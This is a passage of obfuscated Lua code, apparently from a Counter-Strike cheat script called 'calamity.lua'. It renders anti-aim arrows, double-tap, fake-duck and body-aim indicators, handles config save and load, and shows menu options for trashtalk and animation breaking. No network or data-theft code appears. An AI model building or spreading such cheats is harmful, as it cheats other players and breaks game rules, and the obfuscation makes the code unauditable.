v697={};v697.r,v697.g,v697.b=ui.get(v224.visualsTab.watermarkClr2);local v701=352 -(136 + 212) ;local v702,v703=renderer.measure_text("-d",v0:upper());renderer.text(0 -0 ,(v680/2) + 5 + 1 ,255,236 + 19 ,1859 -(240 + 1364) ,v292,"-d",nil,v0:upper()   .. "\a"   .. v212.RGBAtoHEX(v697.r,v697.g,v697.b,v292)   .. ".DEV" );renderer.text(0,(v680/2) + (1096 -(1050 + 32)) ,255,255,910 -655 ,v292,"-d",nil,"USER - "   .. v200.username:upper()   .. "\a"   .. v212.RGBAtoHEX(v697.r,v697.g,v697.b,v292)   .. " ["   .. v200.build:upper()   .. "]" );if (ui.get(v224.visualsTab.watermarkMenu)=="calamity #2") then local v948=0 + 0 ;local v949;while true do if (v948==(1056 -(331 + 724))) then if ((v949~=nil) and (v218~=nil)) then local v1164=3 + 32 ;local v1165,v1166=renderer.measure_text("-d",v0:upper());renderer.gradient(645 -(269 + 375) ,((v680/(727 -(267 + 458))) + v1164) -(1 + 1) ,v1165 * (3 -1) ,(v1166 * (820 -(667 + 151))) -(1498 -(1410 + 87)) ,v697.r,v697.g,v697.b,2022 -(1504 + 393) ,v697.r,v697.g,v697.b,0 -0 ,true);renderer.texture(v949,5 -3 ,(v680/(798.012 -(461 + 335))) + v1164 ,4 + 24 ,v1166 * (1763.45 -(1730 + 31)) ,255,1922 -(728 + 939) ,903 -648 ,255,"f");renderer.text(60 -30 ,((v680/(4 -2)) -(1070 -(138 + 930))) + v1164 ,234 + 21 ,200 + 55 ,255,219 + 36 ,"-d",nil,"CALAMITY"   .. v212.hex({v697.r,v697.g,v697.b})   .. ".DEV" );renderer.text(30,((v680/2) -(1874 -(474 + 1396))) + v1166 + v1164 ,445 -190 ,239 + 16 ,1 + 254 ,730 -475 ,"-d",nil,"USER: "   .. v200.username:upper()   .. v212.hex({v697.r,v697.g,v697.b})   .. " [RECODE]" );else v219();end break;end if (0==v948) then v696=v696 + 1 ;v949=renderer.load_png(v218,83 -58 ,108 -83 );v948=1;end end end if ui.get(v224.visualsTab.arrows) then if (ui.get(v224.visualsTab.arrows)=="Default") then local v1083=0;while true do if (v1083==(592 -(562 + 29))) then renderer.text((v679/2) -(39 + 6) ,(v680/(1421 -(374 + 1045))) -2.5 ,((v254.manualAA==(1 + 0)) and v690.r) or (621 -421) ,((v254.manualAA==(639 -(448 + 190))) and v690.g) or 200 ,((v254.manualAA==(1 + 0)) and v690.b) or (91 + 109) ,v267,"c+",0,"<");break;end if ((0 + 0)==v1083) then v267=(((v254.manualAA==(7 -5)) or (v254.manualAA==(2 -1))) and v212.lerp(v267,1749 -(1307 + 187) ,globals.frametime() * (79 -59) )) or v212.lerp(v267,0 -0 ,globals.frametime() * (61 -41) ) ;renderer.text((v679/2) + (728 -(232 + 451)) ,(v680/2) -(2.5 + 0) ,((v254.manualAA==2) and v690.r) or (177 + 23) ,((v254.manualAA==2) and v690.g) or 200 ,((v254.manualAA==(566 -(510 + 54))) and v690.b) or (402 -202) ,v267,"c+",36 -(13 + 23) ,">");v1083=1;end end end if (ui.get(v224.visualsTab.arrows)=="TS") then renderer.triangle((v679/2) + (106 -51) ,(v680/(2 -0)) + (3 -1) ,(v679/(1090 -(830 + 258))) + (147 -105) ,(v680/(2 + 0)) -7 ,(v679/2) + 36 + 6 ,(v680/(1443 -(860 + 581))) + 11 ,((v254.manualAA==2) and v690.r) or (92 -67) ,((v254.manualAA==(2 + 0)) and v690.g) or (266 -(237 + 4)) ,((v254.manualAA==2) and v690.b) or (58 -33) ,((v254.manualAA==(4 -2)) and v690.a) or (303 -143) );renderer.triangle((v679/(2 + 0)) -55 ,(v680/(2 + 0)) + 2 ,(v679/(7 -5)) -(19 + 23) ,(v680/(2 + 0)) -(1433 -(85 + 1341)) ,(v679/2) -(71 -29) ,(v680/(5 -3)) + (383 -(45 + 327)) ,((v254.manualAA==(1 -0)) and v690.r) or 25 ,((v254.manualAA==1) and v690.g) or (527 -(444 + 58)) ,((v254.manualAA==1) and v690.b) or (11 + 14) ,((v254.manualAA==1) and v690.a) or 160 );renderer.rectangle((v679/2) + 7 + 31 ,(v680/(1 + 1)) -(20 -13) ,2,1750 -(64 + 1668) ,((v682< -(1983 -(1227 + 746))) and v690.r) or 25 ,((v682< -(30 -20)) and v690.g) or (46 -21) ,((v682< -(504 -(415 + 79))) and v690.b) or 25 ,((v682< -10) and v690.a) or (5 + 155) );renderer.rectangle((v679/2) -(531 -(142 + 349)) ,(v680/2) -(3 + 4) ,2,24 -6 ,((v682>(5 + 5)) and v690.r) or (18 + 7) ,((v682>10) and v690.g) or (67 -42) ,((v682>(1874 -(1710 + 154))) and v690.b) or (343 -(200 + 118)) ,((v682>(4 + 6)) and v690.a) or 160 );end end local v704=entity.get_prop(v681,"m_zoomLevel");local v705=entity.get_prop(v678,"m_bIsScoped")==(1 -0) ;local v706=entity.get_prop(v678,"m_bResumeZoom")==(1 -0) ;local v707=(v681~=nil) and (v704~=nil) ;local v708=v707 and (v704>(0 + 0)) and v705 and  not v706 ;local v709=globals.frametime() * (30 + 0) ;if v708 then if (v268<(1 + 0)) then v268=v212.lerp(v268,1 + 0.1 + 0 ,v709);else v268=2 -1 ;end else v268=v212.lerp(v268,0,v709);end if (ui.get(v224.visualsTab.indicators)=="Soft") then local v950=ui.get(ui.reference("MISC","Settings","DPI scale")):gsub("%%","") -(1350 -(363 + 887)) ;local v951="cd";local v952=((v951=="cd-") and ((8 -3) + (v950/10))) or ((42 -33) + (v950/(2 + 8))) ;local v953,v954=renderer.measure_text(v951,"DT");local v955=(v212.includes(ui.get(v224.visualsTab.indicatorsStyle),"State") and 18) or 9 ;local v956=0 -0 ;v954=((v951=="cd-") and (v954-(3 + 0))) or (v954-2) ;local v957=v8.get_double_tap();local v958=ui.get(v224.aaTab.freestandHotkey);local v959=ui.get(v204.forceBaim);local v960=ui.get(v204.safePoint);local v961=ui.get(v204.quickPeek[1666 -(674 + 990) ]);local v962=ui.get(v204.slow[1 + 0 ]) and ui.get(v204.slow[1 + 1 ]) ;local v963=ui.get(v204.os[1 -0 ]) and ui.get(v204.os[1057 -(507 + 548) ]) ;local v964=ui.get(v204.fakeDuck);local v965=ui.get(v204.dt[838 -(289 + 548) ]) and ui.get(v204.dt[1820 -(821 + 997) ]) ;local v966=v205.intToS[v205.pState]:upper();if v212.includes(ui.get(v224.visualsTab.indicatorsStyle),"Name") then v696=v696 + (256 -(195 + 60)) ;local v1084="calamity.lua";local v1085,v1086=renderer.measure_text(v951,((v951=="cd-") and v1084:lower()) or v1084:lower() );local v1087=v257(globals.curtime(),((v951=="cd") and v1084:lower()) or v1084:lower() ,v685.r,v685.g,v685.b,255);renderer.text((v679/2) + (((v1085 + 1 + 1)/2) * v268 * 1.15) ,((v680/(1503 -(251 + 1250))) + (58 -38)) -(v950/(7 + 3)) ,1287 -(809 + 223) ,372 -117 ,765 -510 ,843 -588 ,v951,nil,unpack(v1087));renderer.text((v679/(2 + 0)) + (((v1085 + 2)/2) * v268 * (1.15 + 0)) ,((v680/(619 -(14 + 603))) + 20) -(v950/10) ,384 -(118 + 11) ,42 + 213 ,213 + 42 ,742 -487 ,v951,nil,unpack(v1087));end if v212.includes(ui.get(v224.visualsTab.indicatorsStyle),"State") then local v1088=949 -(551 + 398) ;local v1089;local v1090;local v1091;local v1092;local v1093;while true do if (v1088==(2 + 0)) then if (v1093=="moving") then renderer.text((v679/(1 + 1)) + (((v1091 + 2)/2) * v268 * 1.2) ,(v680/2) + 17 + 3 + (v1090/(3.2 -2)) ,255,587 -332 ,83 + 172 ,1012 -757 ,v951,0,v1093);else renderer.text((v679/(1 + 1)) + (((v1091 + (91 -(40 + 49)))/(7 -5)) * v268 * (491.2 -(99 + 391))) ,(v680/(2 + 0)) + 20 + (v1090/(4.2 -3)) ,631 -376 ,249 + 6 ,670 -415 ,1859 -(1032 + 572) ,v951,417 -(203 + 214) ,v1093);end break;end if (v1088==0) then v696=v696 + (1818 -(568 + 1249)) ;v1089,v1090=renderer.measure_text(v951,((v951=="cd-") and v0:lower()) or v0:lower() );v1088=1;end if ((1 + 0)==v1088) then v1091,v1092=renderer.measure_text(v951,v966:lower());v1093=v966:lower();v1088=4 -2 ;end end end if v212.includes(ui.get(v224.visualsTab.indicatorsStyle),"Doubletap") then v696=v696 + (3 -2) ;if v965 then v280.a=v212.lerp(v280.a,1561 -(913 + 393) ,v709);if (v284.y<(v955 + (v954 * v956))) then v284.y=v212.lerp(v284.y,v955 + (v954 * v956) + (2 -1) ,v709);else v284.y=v955 + (v954 * v956) ;end v282.w=0.1 -0 ;if ( not v957 and (v212.defensive.defensive>(411 -(269 + 141)))) then local v1184=0;while true do if (v1184==(2 -1)) then v280.b=v212.lerp(v280.b,2125 -(362 + 1619) ,v709);break;end if ((1625 -(950 + 675))==v1184) then v280.r=v212.lerp(v280.r,56 + 88 ,v709);v280.g=v212.lerp(v280.g,238,v709);v1184=1180 -(216 + 963) ;end end elseif  not v957 then local v1223=1287 -(485 + 802) ;while true do if (v1223==(559 -(432 + 127))) then v280.r=v212.lerp(v280.r,1295 -(1065 + 8) ,v709);v280.g=v212.lerp(v280.g,55,v709);v1223=1 + 0 ;end if (v1223==(1602 -(635 + 966))) then v280.b=v212.lerp(v280.b,40 + 15 ,v709);break;end end else v280.r=v212.lerp(v280.r,144,v709);v280.g=v212.lerp(v280.g,280 -(5 + 37) ,v709);v280.b=v212.lerp(v280.b,357 -213 ,v709);end v956=v956 + 1 ;elseif  not v965 then local v1185=0;while true do if (v1185==(0 + 0)) then v280.a=v212.lerp(v280.a,0 -0 ,v709);v284.y=v212.lerp(v284.y,v955-(3 + 2) ,v709);break;end end end renderer.text((v679/(3 -1)) + (((renderer.measure_text(v951,((v951=="cd-") and "dt") or "dt" ) + 2)/(7 -5)) * v268 * (1.65 -0)) ,(v680/2) + v284.y + (30 -17) + v952 ,v280.r,v280.g,v280.b,v280.a,v951,v284.w,((v951=="cd-") and "dt") or "dt" );end if v212.includes(ui.get(v224.visualsTab.indicatorsStyle),"Hideshots") then local v1094=0 + 0 ;while true do if (v1094==1) then renderer.text((v679/2) + (((renderer.measure_text(v951,((v951=="cd-") and "HS") or "hs" ) + (531 -(318 + 211)))/(9 -7)) * v268 * (1588.53 -(963 + 624))) ,(v680/(1 + 1)) + v290.y + (859 -(518 + 328)) + v952 ,594 -339 ,407 -152 ,572 -(301 + 16) ,v290.a,v951,v290.w,((v951=="cd-") and "HS") or "hs" );break;end if (v1094==(0 -0)) then v696=v696 + (2 -1) ;if v963 then local v1203=0 -0 ;while true do if (v1203==(1 + 0)) then v956=v956 + 1 ;break;end if (v1203==(0 + 0)) then v290.a=v212.lerp(v290.a,544 -289 ,v709);if (v290.y<(v955 + (v954 * v956))) then v290.y=v212.lerp(v290.y,v955 + (v954 * v956) + 1 ,v709);else v290.y=v955 + (v954 * v956) ;end v1203=1 + 0 ;end end elseif  not v963 then local v1242=0 + 0 ;while true do if ((0 -0)==v1242) then v290.a=v212.lerp(v290.a,0 + 0 ,v709);v290.y=v212.lerp(v290.y,v955-5 ,v709);break;end end end v1094=1020 -(829 + 190) ;end end end if v212.includes(ui.get(v224.visualsTab.indicatorsStyle),"Freestand") then local v1095=0 -0 ;local v1096;while true do if (v1095==1) then v1096=(v205.fs and {352 -97 ,255,61 + 194 }) or {73 + 149 ,52 + 3 ,55} ;renderer.text((v679/(278 -(259 + 17))) + v289.x + (((renderer.measure_text(v951,((v951=="cd-") and "FS") or "fs" ) + 1 + 1)/2) * v268 * (1.75 + 0)) ,(v680/2) + v289.y + (43 -30) + v952 ,v1096[592 -(396 + 195) ],v1096[5 -3 ],v1096[3],v289.a,v951,v289.w,((v951=="cd-") and "FS") or "fs" );break;end if (v1095==(1761 -(440 + 1321))) then v696=v696 + (1830 -(1059 + 770)) ;if v958 then v289.a=v212.lerp(v289.a,1179 -924 ,v709);if (v289.y<(v955 + (v954 * v956))) then v289.y=v212.lerp(v289.y,v955 + (v954 * v956) + 1 ,v709);else v289.y=v955 + (v954 * v956) ;end v956=v956 + (546 -(424 + 121)) ;elseif  not v958 then v289.a=v212.lerp(v289.a,0,v709);v289.y=v212.lerp(v289.y,v955-(1 + 4) ,v709);end v1095=1;end end end if v212.includes(ui.get(v224.visualsTab.indicatorsStyle),"Safepoint") then v696=v696 + 1 ;if v960 then v287.a=v212.lerp(v287.a,255,v709);if (v287.y<(v955 + (v954 * v956))) then v287.y=v212.lerp(v287.y,v955 + (v954 * v956) + (1348 -(641 + 706)) ,v709);else v287.y=v955 + (v954 * v956) ;end v956=v956 + 1 ;elseif  not v960 then local v1188=0 + 0 ;while true do if (v1188==0) then v287.a=v212.lerp(v287.a,0,v709);v287.y=v212.lerp(v287.y,v955-(445 -(249 + 191)) ,v709);break;end end end renderer.text((v679/(8 -6)) + (((renderer.measure_text(v951,((v951=="cd-") and "SP") or "sp" ) + 2)/(1 + 1)) * v268 * 1.8) ,(v680/(7 -5)) + v287.y + (440 -(183 + 244)) + v952 ,255,13 + 242 ,985 -(434 + 296) ,v287.a,v951,0,((v951=="cd-") and "SP") or "sp" );end if v212.includes(ui.get(v224.visualsTab.indicatorsStyle),"Body aim") then local v1097=0 -0 ;while true do if (v1097==(513 -(169 + 343))) then renderer.text((v679/2) + (((renderer.measure_text(v951,((v951=="cd-") and "BA") or "ba" ) + 2 + 0)/(3 -1)) * v268 * 1.5) ,(v680/(5 -3)) + v288.y + 11 + 2 + v952 ,255,722 -467 ,255,v288.a,v951,1123 -(651 + 472) ,((v951=="cd-") and "BA") or "ba" );break;end if (v1097==0) then v696=v696 + 1 + 0 ;if v959 then v288.a=v212.lerp(v288.a,255,v709);if (v288.y<(v955 + (v954 * v956))) then v288.y=v212.lerp(v288.y,v955 + (v954 * v956) + 1 ,v709);else v288.y=v955 + (v954 * v956) ;end v956=v956 + 1 + 0 ;elseif  not v959 then local v1251=0 -0 ;while true do if (v1251==0) then v288.a=v212.lerp(v288.a,0,v709);v288.y=v212.lerp(v288.y,v955-(488 -(397 + 86)) ,v709);break;end end end v1097=877 -(423 + 453) ;end end end if v212.includes(ui.get(v224.visualsTab.indicatorsStyle),"Fakeduck") then v696=v696 + 1 + 0 ;if v964 then local v1156=0;while true do if (v1156==0) then v286.a=v212.lerp(v286.a,34 + 221 ,v709);if (v286.y<(v955 + (v954 * v956))) then v286.y=v212.lerp(v286.y,v955 + (v954 * v956) + 1 ,v709);else v286.y=v955 + (v954 * v956) ;end v1156=1 + 0 ;end if (v1156==1) then v956=v956 + 1 + 0 ;break;end end elseif  not v964 then v286.a=v212.lerp(v286.a,0 + 0 ,v709);v286.y=v212.lerp(v286.y,v955-5 ,v709);end renderer.text((v679/(1192 -(50 + 1140))) + (((renderer.measure_text(v951,((v951=="cd-") and "FD") or "fd" ) + 2 + 0)/(2 + 0)) * v268 * 1.8) ,(v680/2) + v286.y + 1 + 12 + v952 ,255,255,366 -111 ,v286.a,v951,0 + 0 ,((v951=="cd-") and "FD") or "fd" );end end if ((ui.get(v224.visualsTab.minDmgIndicator2)~="Disabled") and (entity.get_classname(v681)~="CKnife")) then if (ui.get(v224.visualsTab.minDmgIndicator2)=="Always on") then if ((ui.get(v204.dmgOverride[597 -(157 + 439) ]) and ui.get(v204.dmgOverride[2 -0 ]))==false) then renderer.text((v679/2) + (9 -6) ,(v680/2) -(44 -29) ,255,1173 -(782 + 136) ,1110 -(112 + 743) ,1426 -(1026 + 145) ,"",0 + 0 ,ui.get(v204.minDmg));else renderer.text((v679/2) + 3 ,(v680/2) -(733 -(493 + 225)) ,937 -682 ,156 + 99 ,255,683 -428 ,"",0 + 0 ,ui.get(v204.dmgOverride[8 -5 ]));end elseif (ui.get(v204.dmgOverride[1 + 0 ]) and ui.get(v204.dmgOverride[2 -0 ]) and (ui.get(v224.visualsTab.minDmgIndicator2)=="Bind")) then dmg=ui.get(v204.dmgOverride[1598 -(210 + 1385) ]);renderer.text((v679/(1691 -(1201 + 488))) + 3 ,(v680/(2 + 0)) -(26 -11) ,255,457 -202 ,255,255,"",0,dmg);end end if (ui.get(v224.visualsTab.watermarkMenu)=="LS") then local v967=585 -(352 + 233) ;local v968;local v969;local v970;local v971;while true do if (v967==2) then renderer.text((v679/(31 -18)) -(v968/1) ,v680/(2.11 + 0) ,725 -470 ,829 -(489 + 85) ,255,1756 -(277 + 1224) ,"c",1493 -(663 + 830) ,unpack(v971));renderer.text((v679/(12 + 1)) -(v968/1) ,v680/2.11 ,624 -369 ,255,1130 -(461 + 414) ,255,"c",0,unpack(v971));break;end if (v967==(0 + 0)) then v968,v969=renderer.measure_text("cd","C A L A M I T Y");v970="C A L A M I T Y [BETA]";v967=1 + 0 ;end if (1==v967) then v971=v257(globals.curtime(),((globalFlag=="cd") and v970:upper()) or v970:upper() ,25 + 230 ,252 + 3 ,505 -(172 + 78) ,255);renderer.text((v679/(20 -7)) -(v968/(1 + 0)) ,v680/2.11 ,255,367 -112 ,255,255,"c",0,unpack(v971));v967=1 + 1 ;end end end local v710=(ui.get(v224.visualsTab.logs) and client.set_event_callback) or client.unset_event_callback ;if v710 then v251.render();end end);ui.update(v224.configTab.list,v230());if (database.read(v201.database.configs)==nil) then database.write(v201.database.configs,{});end ui.set(v224.configTab.name,(( #database.read(v201.database.configs)==0) and "") or database.read(v201.database.configs)[ui.get(v224.configTab.list) + 1 + 0 ].name );ui.set_callback(v224.configTab.list,function(v711) local v712=function() local v858=0;local v859;local v860;while true do if (v858==1) then v860=v230();if (v860==nil) then return;end v858=2;end if (v858==(0 -0)) then if (v711==nil) then return;end v859="";v858=1 -0 ;end if (v858==(1 + 1)) then v859=v860[ui.get(v711) + 1 + 0 ] or "" ;ui.set(v224.configTab.name,v859);break;end end end;if pcall(v712) then end end);ui.set_callback(v224.configTab.load,function() local v713=0;local v714;local v715;local v716;local v717;local v718;while true do if (v713==(0 + 0)) then v714,v715,v716=ui.get(v224.visualsTab.logsClr);v717=ui.get(v224.configTab.name);v713=3 -2 ;end if (v713==(4 -2)) then if pcall(v718) then v717=v717:gsub("*","");v251.new(string.format(' Successfully loaded "$%s$" ',v717),v714,v715,v716);else v251.new(string.format(' Failed to load "$%s$" ',v717),79 + 176 ,69 + 51 ,567 -(133 + 314) );end break;end if (v713==(1 + 0)) then if (v717=="") then return;end function v718() v237(v717);end v713=215 -(199 + 14) ;end end end);ui.set_callback(v224.configTab.save,function() local v719=0 -0 ;local v720;local v721;local v722;local v723;local v724;while true do if (v719==3) then if pcall(v724) then v251.new(string.format(' Successfully saved "$%s$" ',v723),v720,v721,v722);else v251.new(string.format(' Failed to save "$%s$" ',v723),1804 -(647 + 902) ,360 -240 ,120);end break;end if (v719==(233 -(85 + 148))) then v720,v721,v722=ui.get(v224.visualsTab.logsClr);v723=ui.get(v224.configTab.name);v719=1;end if (v719==1) then if (v723=="") then return;end for v1098,v1099 in pairs(v203) do if (v1099.name==v723:gsub("*Default","")) then v251.new(string.format(' You can`t save built-in preset "$%s$" ',v723:gsub("*","")),255,1409 -(426 + 863) ,120);return;end end v719=9 -7 ;end if (v719==(1656 -(873 + 781))) then if (v723:match("[^%w]")~=nil) then local v1124=0 -0 ;while true do if (v1124==(0 -0)) then v251.new(string.format(' Failed to save "$%s$" due to invalid characters ',v723),106 + 149 ,120,120);return;end end end function v724() v228(v723);ui.update(v224.configTab.list,v230());end v719=3;end end end);ui.set_callback(v224.configTab.delete,function() local v725=ui.get(v224.configTab.name);if (v725=="") then return;end local v726,v727,v728=ui.get(v224.visualsTab.logsClr);if (v229(v725)==false) then local v972=0 -0 ;while true do if (v972==1) then return;end if (v972==0) then v251.new(string.format(' Failed to delete "$%s$" ',v725),365 -110 ,356 -236 ,2067 -(414 + 1533) );ui.update(v224.configTab.list,v230());v972=1 + 0 ;end end end for v861,v862 in pairs(v203) do if (v862.name==v725:gsub("*","")) then v251.new(string.format(' You can`t delete built-in preset "$%s$" ',v725:gsub("*","")),810 -(443 + 112) ,120,1599 -(888 + 591) );return;end end local v729=function() v229(v725);end;if pcall(v729) then ui.update(v224.configTab.list,v230());ui.set(v224.configTab.list,( #v203 +  #database.read(v201.database.configs)) -#database.read(v201.database.configs) );ui.set(v224.configTab.name,(( #database.read(v201.database.configs)==(0 -0)) and "") or v230()[(( #v203 +  #database.read(v201.database.configs)) -#database.read(v201.database.configs)) + 1 + 0 ] );v251.new(string.format(' Successfully deleted "$%s$" ',v725),v726,v727,v728);end end);ui.set_callback(v224.configTab.import,function() local v730=0 -0 ;local v731;local v732;local v733;local v734;while true do if (0==v730) then v731,v732,v733=ui.get(v224.visualsTab.logsClr);function v734() v235();end v730=1;end if (v730==1) then if pcall(v734) then v251.new(string.format(" Successfully imported settings! ",name),v731,v732,v733);else v251.new(string.format(" Failed to import settings! ",name),255,47 + 73 ,59 + 61 );end break;end end end);ui.set_callback(v224.configTab.export,function() local v735=ui.get(v224.configTab.name);if (v735=="") then return;end local v736=function() v236(v735);end;local v737,v738,v739=ui.get(v224.visualsTab.logsClr);if pcall(v736) then v251.new(string.format(" Successfully exported settings! ",v735),v737,v738,v739);else v251.new(string.format(" Failed to export settings! ",v735),28 + 227 ,228 -108 ,222 -102 );end end);client.set_event_callback("paint_ui",function() v205.activeState=v205.sToInt[ui.get(v224.builderTab.state)];local v742=ui.get(v222);ui.set_visible(v223,v742);local v743=ui.get(v223)=="Anti-aim" ;local v744=ui.get(v223)=="Builder" ;local v745=ui.get(v223)=="Visuals" ;local v746=ui.get(v223)=="Misc" ;local v747=ui.get(v223)=="Config" ;ui.set(v225[1].enableState,true);for v863=1679 -(136 + 1542) , #v205.aaStates do local v864=0 -0 ;local v865;while true do if (v864==8) then ui.set_visible(v225[v863].defensivePitch,(v205.activeState==v863) and v744 and v865 and v742 );ui.set_visible(v225[v863].defensivePitchSlider,(v205.activeState==v863) and v744 and v865 and v742 and ((ui.get(v225[v863].defensivePitch)=="Custom") or (ui.get(v225[v863].defensivePitch)=="Jitter")) );ui.set_visible(v225[v863].defensivePitchSlider2,(v205.activeState==v863) and v744 and v865 and v742 and (ui.get(v225[v863].defensivePitch)=="Jitter") );break;end if (v864==4) then ui.set_visible(v225[v863].yawJitterCondition,(v205.activeState==v863) and (ui.get(v225[v863].yawJitter)~="Off") and v744 and v865 and v742 );ui.set_visible(v225[v863].yawJitterStatic,(v205.activeState==v863) and (ui.get(v225[v863].yawJitter)~="Off") and (ui.get(v225[v863].yawJitterCondition)=="Static") and v744 and v865 and v742 );ui.set_visible(v225[v863].yawJitterLeft,(v205.activeState==v863) and (ui.get(v225[v863].yawJitter)~="Off") and (ui.get(v225[v863].yawJitterCondition)=="L & R") and v744 and v865 and v742 );v864=5;end if (v864==6) then ui.set_visible(v225[v863].bodyYawSlider,(v205.activeState==v863) and (ui.get(v225[v863].bodyYaw)~="Off") and v744 and v865 and v742 );ui.set_visible(v225[v863].defensiveOpt,(v205.activeState==v863) and v744 and v865 and v742 );ui.set_visible(v225[v863].defensiveOptSlider,(v205.activeState==v863) and v744 and v865 and v742 and (ui.get(v225[v863].defensiveOpt)=="Always on Tick") );v864=7;end if (v864==0) then v865=ui.get(v225[v863].enableState);ui.set_visible(v225[v863].enableState,(v205.activeState==v863) and v744 and v742 );ui.set_visible(v225[v863].pitch,(v205.activeState==v863) and v744 and v865 and v742 );v864=1 + 0 ;end if (v864==(4 -1)) then ui.set_visible(v225[v863].yawRight,(v205.activeState==v863) and (ui.get(v225[v863].yaw)~="Off") and (ui.get(v225[v863].yawCondition)~="Static") and v744 and v865 and v742 );ui.set_visible(v225[v863].yawSpeed,(v205.activeState==v863) and (ui.get(v225[v863].yaw)~="Off") and (ui.get(v225[v863].yawCondition)=="Slow Jitter") and v744 and v865 and v742 );ui.set_visible(v225[v863].yawJitter,(v205.activeState==v863) and (ui.get(v225[v863].yaw)~="Off") and v744 and v865 and v742 );v864=4;end if (v864==(6 + 1)) then ui.set_visible(v225[v863].defensiveYaw,(v205.activeState==v863) and v744 and v865 and v742 );ui.set_visible(v225[v863].defensiveYawSlider,(v205.activeState==v863) and v744 and v865 and v742 and (ui.get(v225[v863].defensiveYaw)=="Custom") );ui.set_visible(v225[v863].defensiveYawSlider2,(v205.activeState==v863) and v744 and v865 and v742 and (ui.get(v225[v863].defensiveYaw)=="Spin") );v864=494 -(68 + 418) ;end if (v864==(2 -1)) then ui.set_visible(v225[v863].pitchSlider,(v205.activeState==v863) and v744 and v865 and (ui.get(v225[v863].pitch)=="Custom") and v742 );ui.set_visible(v225[v863].yawBase,(v205.activeState==v863) and v744 and v865 and v742 );ui.set_visible(v225[v863].yaw,(v205.activeState==v863) and v744 and v865 and v742 );v864=3 -1 ;end if (v864==2) then ui.set_visible(v225[v863].yawCondition,(v205.activeState==v863) and (ui.get(v225[v863].yaw)~="Off") and v744 and v865 and v742 );ui.set_visible(v225[v863].yawStatic,(v205.activeState==v863) and (ui.get(v225[v863].yaw)~="Off") and (ui.get(v225[v863].yawCondition)=="Static") and v744 and v865 and v742 );ui.set_visible(v225[v863].yawLeft,(v205.activeState==v863) and (ui.get(v225[v863].yaw)~="Off") and (ui.get(v225[v863].yawCondition)~="Static") and v744 and v865 and v742 );v864=3 + 0 ;end if (v864==5) then ui.set_visible(v225[v863].yawJitterRight,(v205.activeState==v863) and (ui.get(v225[v863].yawJitter)~="Off") and (ui.get(v225[v863].yawJitterCondition)=="L & R") and v744 and v865 and v742 );ui.set_visible(v225[v863].yawJitterDisablers,(v205.activeState==v863) and (ui.get(v225[v863].yawJitter)~="Off") and v744 and v865 and v742 );ui.set_visible(v225[v863].bodyYaw,(v205.activeState==v863) and v744 and v865 and v742 );v864=1098 -(770 + 322) ;end end end for v866,v867 in pairs(v224.aaTab) do if (type(v867)~="table") then ui.set_visible(v867,v743 and v742 );end end for v868,v869 in pairs(v224.aaTab.manualTab) do if (type(v869)~="table") then ui.set_visible(v869,v743 and v742 );end end for v870,v871 in pairs(v224.builderTab) do ui.set_visible(v871,v744 and v742 );end for v872,v873 in pairs(v224.visualsTab) do if (type(v873)~="table") then ui.set_visible(v873,v745 and v742 );end end ui.set_visible(v224.aaTab.freestandHotkey,v212.includes(ui.get(v224.aaTab.aamenushka),"Freestand") and v743 and v742 );ui.set_visible(v224.aaTab.freestandDisablers,v212.includes(ui.get(v224.aaTab.aamenushka),"Freestand") and v743 and v742 );ui.set_visible(v224.aaTab.edgeYawHotkey,v212.includes(ui.get(v224.aaTab.aamenushka),"Edge Yaw") and v743 and v742 );ui.set_visible(v224.aaTab.manualTab.manualLeft,v212.includes(ui.get(v224.aaTab.aamenushka),"Manuals") and v743 and v742 );ui.set_visible(v224.aaTab.manualTab.manualRight,v212.includes(ui.get(v224.aaTab.aamenushka),"Manuals") and v743 and v742 );ui.set_visible(v224.aaTab.manualTab.manualReset,v212.includes(ui.get(v224.aaTab.aamenushka),"Manuals") and v743 and v742 );ui.set_visible(v224.aaTab.manualTab.manualForward,v212.includes(ui.get(v224.aaTab.aamenushka),"Manuals") and v743 and v742 );ui.set_visible(v224.visualsTab.space3,ui.get(v224.visualsTab.space3) and v745 and v742 );ui.set_visible(v224.visualsTab.BackgroundColorLabel,ui.get(v224.visualsTab.BackgroundColorLabel) and v745 and v742 );ui.set_visible(v224.visualsTab.logsClr,v212.includes(ui.get(v224.visualsTab.logs),"On screen") and v745 and v742 );ui.set_visible(v224.visualsTab.logOffset,v212.includes(ui.get(v224.visualsTab.logs),"On screen") and v745 and v742 );ui.set_visible(v224.visualsTab.aspect_ratio_v,ui.get(v224.visualsTab.aspect_ratio) and v745 and v742 );ui.set_visible(v224.visualsTab.indicatorsStyle,(ui.get(v224.visualsTab.indicators)=="Soft") and v745 and v742 );ui.set_visible(v224.visualsTab.indicatorsClr,(ui.get(v224.visualsTab.indicators)=="Soft") and v745 and v742 );ui.set_visible(v224.visualsTab.arrowClr,(ui.get(v224.visualsTab.arrows)~="Disabled") and v745 and v742 );ui.set_visible(v224.visualsTab.watermarkClr2,(ui.get(v224.visualsTab.watermarkMenu)~="Disabled") and (ui.get(v224.visualsTab.watermarkMenu)~="LS") and v745 and v742 );for v874,v875 in pairs(v224.miscTab) do if (type(v875)~="table") then ui.set_visible(v875,v746 and v742 );end end ui.set_visible(v224.miscTab.trashTalk,v212.includes(ui.get(v224.miscTab.miscmenushka),"Trashtalk") and v746 and v742 );ui.set_visible(v224.miscTab.fastLadderEnabled,v212.includes(ui.get(v224.miscTab.miscmenushka),"Fast Ladder") and v746 and v742 );ui.set_visible(v224.miscTab.animationsEnabled,v212.includes(ui.get(v224.miscTab.miscmenushka),"Animation Breaker") and v746 and v742 );ui.set_visible(v224.miscTab.fastLadder,ui.get(v224.miscTab.fastLadderEnabled) and v212.includes(ui.get(v224.miscTab.miscmenushka),"Fast Ladder") and v746 and v742 );ui.set_visible(v224.miscTab.animations,ui.get(v224.miscTab.animationsEnabled) and v212.includes(ui.get(v224.miscTab.miscmenushka),"Animation Breaker") and v746 and v742 );ui.set_visible(v224.miscTab.jitterFixEnabled,v212.includes(ui.get(v224.miscTab.miscmenushka),v212.hex({170,170,14 + 82 })   .. "Jitter Fix *WIP*" ) and ui.get(v224.miscTab.jitterFix) and v746 and v742 );ui.set_visible(v224.miscTab.jitterFix,v212.includes(ui.get(v224.miscTab.miscmenushka),v212.hex({329 -159 ,625 -455 ,96})   .. "Jitter Fix *WIP*" ) and ui.get(v224.miscTab.jitterFixEnabled) and v746 and v742 );ui.set_visible(v224.miscTab.jitterFixOffset,(ui.get(v224.miscTab.jitterFix)=="By Delta") and ui.get(v224.miscTab.jitterFix) and v746 and v742 );ui.set_visible(v224.miscTab.animations,ui.get(v224.miscTab.animationsEnabled) and 